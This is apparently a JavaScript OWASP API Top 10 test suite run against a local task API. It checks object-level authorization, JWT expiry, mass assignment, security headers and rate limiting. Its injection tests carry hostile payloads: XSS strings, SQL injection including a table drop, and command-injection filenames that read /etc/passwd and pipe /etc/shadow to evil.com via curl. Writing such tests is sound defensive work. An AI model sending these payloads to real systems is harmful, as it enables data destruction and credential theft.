/**
 * OWASP API Security Top 10 2023 - Comprehensive Test Suite
 * Tests API1, API2, API3, API8, API10 vulnerabilities
 *
 * Usage: node owasp-api-tests.js
 */

const http = require('http');
const https = require('https');

const API_BASE = process.env.API_BASE || 'http://localhost:8000';
const RESULTS_FILE = './owasp-zap-scan-results.json';

// Test results storage
const testResults = {
  timestamp: new Date().toISOString(),
  apiBase: API_BASE,
  tests: [],
  summary: {
    total: 0,
    passed: 0,
    failed: 0,
    critical: 0,
    high: 0,
    medium: 0,
    low: 0
  }
};

// Helper function to make HTTP requests
async function makeRequest(options) {
  return new Promise((resolve, reject) => {
    const client = options.protocol === 'https:' ? https : http;
    const req = client.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => data += chunk);
      res.on('end', () => {
        resolve({
          status: res.statusCode,
          headers: res.headers,
          body: data
        });
      });
    });
    req.on('error', reject);
    if (options.body) {
      req.write(JSON.stringify(options.body));
    }
    req.end();
  });
}

// API1: Broken Object Level Authorization (BOLA)
async function testBOLA() {
  console.log('\n🔒 Testing API1: Broken Object Level Authorization (BOLA)...');
  const results = [];

  try {
    // Step 1: Login as user1 and get token
    const loginResponse = await makeRequest({
      method: 'POST',
      hostname: 'localhost',
      port: 8000,
      path: '/api/auth/login',
      headers: { 'Content-Type': 'application/json' },
      body: { username: 'testuser1', password: 'password123' }
    });

    const user1Token = JSON.parse(loginResponse.body).access_token;

    // Step 2: Get user1's tasks (should succeed)
    const user1TasksResponse = await makeRequest({
      method: 'GET',
      hostname: 'localhost',
      port: 8000,
      path: '/api/tasks?user_id=1',
      headers: { 'Authorization': `Bearer ${user1Token}` }
    });

    results.push({
      test: 'BOLA - Access own tasks',
      severity: 'INFO',
      status: user1TasksResponse.status === 200 ? 'PASS' : 'FAIL',
      expected: 200,
      actual: user1TasksResponse.status,
      description: 'User should be able to access their own tasks'
    });

    // Step 3: Try to access user2's tasks with user1's token (should fail with 403)
    const user2TasksResponse = await makeRequest({
      method: 'GET',
      hostname: 'localhost',
      port: 8000,
      path: '/api/tasks?user_id=2',
      headers: { 'Authorization': `Bearer ${user1Token}` }
    });

    const bolaVulnerable = user2TasksResponse.status === 200;
    results.push({
      test: 'BOLA - Access other user tasks',
      severity: bolaVulnerable ? 'CRITICAL' : 'PASS',
      status: user2TasksResponse.status === 403 ? 'PASS' : 'FAIL',
      expected: 403,
      actual: user2TasksResponse.status,
      description: bolaVulnerable
        ? '🚨 CRITICAL: User can access other users\' tasks (BOLA vulnerability)'
        : '✅ BOLA protection working correctly'
    });

    if (bolaVulnerable) {
      testResults.summary.critical++;
    }

  } catch (error) {
    results.push({
      test: 'BOLA - Test execution',
      severity: 'HIGH',
      status: 'ERROR',
      description: `Test failed: ${error.message}`
    });
    testResults.summary.high++;
  }

  testResults.tests.push(...results);
  return results;
}

// API2: Broken Authentication
async function testBrokenAuthentication() {
  console.log('\n🔑 Testing API2: Broken Authentication...');
  const results = [];

  try {
    // Test 1: JWT expiration
    const expiredToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.4Adcj0v0r1zg0yTKVv6s1C5I3n5ZYyYx4Yb2XZ5W9Eg';

    const expiredTokenResponse = await makeRequest({
      method: 'GET',
      hostname: 'localhost',
      port: 8000,
      path: '/api/tasks',
      headers: { 'Authorization': `Bearer ${expiredToken}` }
    });

    const acceptsExpiredToken = expiredTokenResponse.status === 200;
    results.push({
      test: 'JWT Expiration Validation',
      severity: acceptsExpiredToken ? 'HIGH' : 'PASS',
      status: expiredTokenResponse.status === 401 ? 'PASS' : 'FAIL',
      expected: 401,
      actual: expiredTokenResponse.status,
      description: acceptsExpiredToken
        ? '🚨 HIGH: Server accepts expired JWT tokens'
        : '✅ JWT expiration validation working'
    });

    // Test 2: Token refresh flow
    const loginResponse = await makeRequest({
      method: 'POST',
      hostname: 'localhost',
      port: 8000,
      path: '/api/auth/login',
      headers: { 'Content-Type': 'application/json' },
      body: { username: 'testuser1', password: 'password123' }
    });

    const tokens = JSON.parse(loginResponse.body);
    const hasRefreshToken = 'refresh_token' in tokens;

    results.push({
      test: 'Refresh Token Availability',
      severity: hasRefreshToken ? 'PASS' : 'MEDIUM',
      status: hasRefreshToken ? 'PASS' : 'FAIL',
      description: hasRefreshToken
        ? '✅ Refresh token mechanism implemented'
        : '⚠️ MEDIUM: No refresh token mechanism (forces re-login)'
    });

    // Test 3: Weak password acceptance
    const weakPasswordResponse = await makeRequest({
      method: 'POST',
      hostname: 'localhost',
      port: 8000,
      path: '/api/auth/register',
      headers: { 'Content-Type': 'application/json' },
      body: { username: 'testuser', password: '123' }
    });

    const acceptsWeakPassword = weakPasswordResponse.status === 201;
    results.push({
      test: 'Weak Password Prevention',
      severity: acceptsWeakPassword ? 'MEDIUM' : 'PASS',
      status: weakPasswordResponse.status === 400 ? 'PASS' : 'FAIL',
      expected: 400,
      actual: weakPasswordResponse.status,
      description: acceptsWeakPassword
        ? '⚠️ MEDIUM: Server accepts weak passwords'
        : '✅ Password strength validation working'
    });

    if (acceptsExpiredToken) testResults.summary.high++;
    if (!hasRefreshToken || acceptsWeakPassword) testResults.summary.medium++;

  } catch (error) {
    results.push({
      test: 'Broken Authentication - Test execution',
      severity: 'HIGH',
      status: 'ERROR',
      description: `Test failed: ${error.message}`
    });
  }

  testResults.tests.push(...results);
  return results;
}

// API3: Broken Object Property Level Authorization
async function testBrokenPropertyAuthorization() {
  console.log('\n📝 Testing API3: Broken Object Property Level Authorization...');
  const results = [];

  try {
    // Login and get token
    const loginResponse = await makeRequest({
      method: 'POST',
      hostname: 'localhost',
      port: 8000,
      path: '/api/auth/login',
      headers: { 'Content-Type': 'application/json' },
      body: { username: 'testuser1', password: 'password123' }
    });

    const token = JSON.parse(loginResponse.body).access_token;

    // Test 1: Excessive data exposure
    const userResponse = await makeRequest({
      method: 'GET',
      hostname: 'localhost',
      port: 8000,
      path: '/api/users/me',
      headers: { 'Authorization': `Bearer ${token}` }
    });

    const userData = JSON.parse(userResponse.body);
    const exposesPassword = 'password' in userData || 'password_hash' in userData;

    results.push({
      test: 'Password Hash Exposure',
      severity: exposesPassword ? 'CRITICAL' : 'PASS',
      status: exposesPassword ? 'FAIL' : 'PASS',
      description: exposesPassword
        ? '🚨 CRITICAL: API exposes password hashes in user data'
        : '✅ Sensitive data properly filtered'
    });

    // Test 2: Mass assignment vulnerability
    const massAssignmentResponse = await makeRequest({
      method: 'PATCH',
      hostname: 'localhost',
      port: 8000,
      path: '/api/users/me',
      headers: {
        'Authorization': `Bearer ${token}`,
        'Content-Type': 'application/json'
      },
      body: {
        name: 'Updated Name',
        is_admin: true,  // Should NOT be allowed
        role: 'admin'    // Should NOT be allowed
      }
    });

    const updatedUser = JSON.parse(massAssignmentResponse.body);
    const massAssignmentVuln = updatedUser.is_admin === true || updatedUser.role === 'admin';

    results.push({
      test: 'Mass Assignment Protection',
      severity: massAssignmentVuln ? 'HIGH' : 'PASS',
      status: massAssignmentVuln ? 'FAIL' : 'PASS',
      description: massAssignmentVuln
        ? '🚨 HIGH: Mass assignment allows privilege escalation'
        : '✅ Mass assignment protection working'
    });

    if (exposesPassword) testResults.summary.critical++;
    if (massAssignmentVuln) testResults.summary.high++;

  } catch (error) {
    results.push({
      test: 'Property Authorization - Test execution',
      severity: 'HIGH',
      status: 'ERROR',
      description: `Test failed: ${error.message}`
    });
  }

  testResults.tests.push(...results);
  return results;
}

// API8: Security Misconfiguration
async function testSecurityMisconfiguration() {
  console.log('\n⚙️  Testing API8: Security Misconfiguration...');
  const results = [];

  try {
    // Test 1: CSP headers
    const response = await makeRequest({
      method: 'GET',
      hostname: 'localhost',
      port: 8000,
      path: '/api/tasks'
    });

    const hasCSP = 'content-security-policy' in response.headers;
    results.push({
      test: 'Content Security Policy',
      severity: hasCSP ? 'PASS' : 'MEDIUM',
      status: hasCSP ? 'PASS' : 'FAIL',
      description: hasCSP
        ? '✅ CSP headers configured'
        : '⚠️ MEDIUM: Missing Content-Security-Policy headers'
    });

    // Test 2: CORS configuration
    const hasCORS = 'access-control-allow-origin' in response.headers;
    const corsWildcard = response.headers['access-control-allow-origin'] === '*';

    results.push({
      test: 'CORS Configuration',
      severity: corsWildcard ? 'MEDIUM' : (hasCORS ? 'PASS' : 'LOW'),
      status: (hasCORS && !corsWildcard) ? 'PASS' : 'FAIL',
      description: corsWildcard
        ? '⚠️ MEDIUM: CORS allows all origins (*) - potential security risk'
        : hasCORS
          ? '✅ CORS properly configured'
          : 'ℹ️ LOW: CORS headers not found (may be intentional)'
    });

    // Test 3: Rate limiting
    const rateLimitRequests = [];
    for (let i = 0; i < 100; i++) {
      rateLimitRequests.push(
        makeRequest({
          method: 'GET',
          hostname: 'localhost',
          port: 8000,
          path: '/api/tasks'
        })
      );
    }

    const rateLimitResponses = await Promise.all(rateLimitRequests);
    const rateLimited = rateLimitResponses.some(r => r.status === 429);

    results.push({
      test: 'Rate Limiting',
      severity: rateLimited ? 'PASS' : 'MEDIUM',
      status: rateLimited ? 'PASS' : 'FAIL',
      description: rateLimited
        ? '✅ Rate limiting configured (HTTP 429 received)'
        : '⚠️ MEDIUM: No rate limiting detected - vulnerable to DDoS'
    });

    // Test 4: Security headers
    const securityHeaders = {
      'x-frame-options': 'Clickjacking protection',
      'x-content-type-options': 'MIME sniffing protection',
      'strict-transport-security': 'HTTPS enforcement',
      'x-xss-protection': 'XSS protection'
    };

    Object.entries(securityHeaders).forEach(([header, description]) => {
      const hasHeader = header in response.headers;
      results.push({
        test: `Security Header: ${header}`,
        severity: hasHeader ? 'PASS' : 'LOW',
        status: hasHeader ? 'PASS' : 'WARN',
        description: hasHeader
          ? `✅ ${description} enabled`
          : `ℹ️ LOW: Missing ${header} (${description})`
      });
    });

    if (!hasCSP || corsWildcard || !rateLimited) testResults.summary.medium++;

  } catch (error) {
    results.push({
      test: 'Security Misconfiguration - Test execution',
      severity: 'HIGH',
      status: 'ERROR',
      description: `Test failed: ${error.message}`
    });
  }

  testResults.tests.push(...results);
  return results;
}

// API10: Unsafe Consumption of APIs
async function testUnsafeAPIConsumption() {
  console.log('\n🛡️  Testing API10: Unsafe Consumption of APIs...');
  const results = [];

  try {
    // Get auth token
    const loginResponse = await makeRequest({
      method: 'POST',
      hostname: 'localhost',
      port: 8000,
      path: '/api/auth/login',
      headers: { 'Content-Type': 'application/json' },
      body: { username: 'testuser1', password: 'password123' }
    });

    const token = JSON.parse(loginResponse.body).access_token;

    // Test 1: XSS via task title
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      'javascript:alert("XSS")',
      '<svg onload=alert("XSS")>'
    ];

    for (const payload of xssPayloads) {
      const createResponse = await makeRequest({
        method: 'POST',
        hostname: 'localhost',
        port: 8000,
        path: '/api/tasks',
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        },
        body: {
          title: payload,
          description: 'XSS test',
          status: 'pending'
        }
      });

      const taskData = JSON.parse(createResponse.body);
      const xssVulnerable = taskData.title === payload; // Not sanitized

      results.push({
        test: `XSS Prevention - ${payload.substring(0, 30)}...`,
        severity: xssVulnerable ? 'HIGH' : 'PASS',
        status: xssVulnerable ? 'FAIL' : 'PASS',
        description: xssVulnerable
          ? `🚨 HIGH: XSS payload stored unsanitized: ${payload}`
          : '✅ Input properly sanitized'
      });

      if (xssVulnerable) testResults.summary.high++;
    }

    // Test 2: SQL injection
    const sqlPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE tasks; --",
      "' UNION SELECT NULL, username, password FROM users--"
    ];

    for (const payload of sqlPayloads) {
      const sqlResponse = await makeRequest({
        method: 'GET',
        hostname: 'localhost',
        port: 8000,
        path: `/api/tasks?search=${encodeURIComponent(payload)}`,
        headers: { 'Authorization': `Bearer ${token}` }
      });

      const sqlVulnerable = sqlResponse.status === 500 ||
                           sqlResponse.body.includes('password') ||
                           sqlResponse.body.includes('SQL');

      results.push({
        test: `SQL Injection - ${payload.substring(0, 30)}...`,
        severity: sqlVulnerable ? 'CRITICAL' : 'PASS',
        status: sqlVulnerable ? 'FAIL' : 'PASS',
        description: sqlVulnerable
          ? `🚨 CRITICAL: SQL injection vulnerability detected`
          : '✅ SQL injection protection working'
      });

      if (sqlVulnerable) testResults.summary.critical++;
    }

    // Test 3: Command injection
    const cmdPayloads = [
      '; ls -la',
      '| cat /etc/passwd',
      '`whoami`',
      '$(curl http://evil.com/steal?data=$(cat /etc/shadow))'
    ];

    for (const payload of cmdPayloads) {
      const cmdResponse = await makeRequest({
        method: 'POST',
        hostname: 'localhost',
        port: 8000,
        path: '/api/tasks/export',
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        },
        body: { filename: `tasks${payload}.csv` }
      });

      const cmdVulnerable = cmdResponse.status === 500 ||
                           cmdResponse.body.includes('root:') ||
                           cmdResponse.body.includes('bin/bash');

      results.push({
        test: `Command Injection - ${payload.substring(0, 30)}...`,
        severity: cmdVulnerable ? 'CRITICAL' : 'PASS',
        status: cmdVulnerable ? 'FAIL' : 'PASS',
        description: cmdVulnerable
          ? `🚨 CRITICAL: Command injection vulnerability detected`
          : '✅ Command injection protection working'
      });

      if (cmdVulnerable) testResults.summary.critical++;
    }

  } catch (error) {
    results.push({
      test: 'Unsafe API Consumption - Test execution',
      severity: 'HIGH',
      status: 'ERROR',
      description: `Test failed: ${error.message}`
    });
  }

  testResults.tests.push(...results);
  return results;
}

// Generate summary report
function generateReport() {
  console.log('\n📊 OWASP API Security Test Summary\n');
  console.log('═'.repeat(80));
  console.log(`Total Tests: ${testResults.summary.total}`);
  console.log(`Passed: ${testResults.summary.passed}`);
  console.log(`Failed: ${testResults.summary.failed}`);
  console.log('\nSeverity Breakdown:');
  console.log(`🚨 CRITICAL: ${testResults.summary.critical}`);
  console.log(`🔴 HIGH: ${testResults.summary.high}`);
  console.log(`🟡 MEDIUM: ${testResults.summary.medium}`);
  console.log(`🔵 LOW: ${testResults.summary.low}`);
  console.log('═'.repeat(80));

  // Write to file
  const fs = require('fs');
  fs.writeFileSync(RESULTS_FILE, JSON.stringify(testResults, null, 2));
  console.log(`\n✅ Results saved to ${RESULTS_FILE}`);
}

// Main execution
async function runAllTests() {
  console.log('🔒 Starting OWASP API Security Top 10 2023 Tests');
  console.log(`API Base: ${API_BASE}\n`);

  try {
    await testBOLA();
    await testBrokenAuthentication();
    await testBrokenPropertyAuthorization();
    await testSecurityMisconfiguration();
    await testUnsafeAPIConsumption();

    // Calculate totals
    testResults.summary.total = testResults.tests.length;
    testResults.summary.passed = testResults.tests.filter(t => t.status === 'PASS').length;
    testResults.summary.failed = testResults.summary.total - testResults.summary.passed;

    generateReport();

    // Exit with error if critical or high severity issues found
    if (testResults.summary.critical > 0 || testResults.summary.high > 0) {
      console.error('\n❌ SECURITY AUDIT FAILED: Critical or high severity issues detected!');
      process.exit(1);
    } else {
      console.log('\n✅ SECURITY AUDIT PASSED: No critical or high severity issues found');
      process.exit(0);
    }

  } catch (error) {
    console.error('❌ Test execution failed:', error.message);
    process.exit(1);
  }
}

// Run if called directly
if (require.main === module) {
  runAllTests();
}

module.exports = { runAllTests, testResults };
